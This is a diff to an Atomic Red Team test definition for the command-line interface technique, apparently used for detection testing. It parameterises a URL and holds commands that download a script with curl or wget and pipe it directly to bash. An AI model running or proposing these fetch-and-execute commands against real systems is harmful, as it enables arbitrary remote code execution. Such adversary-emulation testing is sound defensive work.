@@ -5,16 +5,21 @@ display_name: Command-Line Interface
 atomic_tests:
 - name: Command-Line Interface
   description: |
-    Using Curl to download and pipe a payload to Bash. NOTE: Curl-ing to Bash is generally a bad idea if you don't control the server.
-
+    Using Curl and wget to download and pipe a payload to Bash. NOTE: Curl-ing or wget-ing to Bash is generally a bad idea if you don't control the server.
+    Always checkout the payload.
     This will download the specified payload and set a marker file in `/tmp/art-fish.txt`.
 
   supported_platforms:
     - macos
     - linux
+  input_arguments:
+    input_url:
+      description: URL of script to execute
+      type: Path
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh
 
   executor:
     name: sh
     command: |
-      bash -c "curl -sS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059/echo-art-fish.sh | bash"
-      bash -c "wget --quiet -O - https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/Atomics/T1059/echo-art-fish.sh | bash"
+      bash -c "curl -sS #{input_url} | bash"
+      bash -c "wget --quiet -O - #{input_url} | bash"
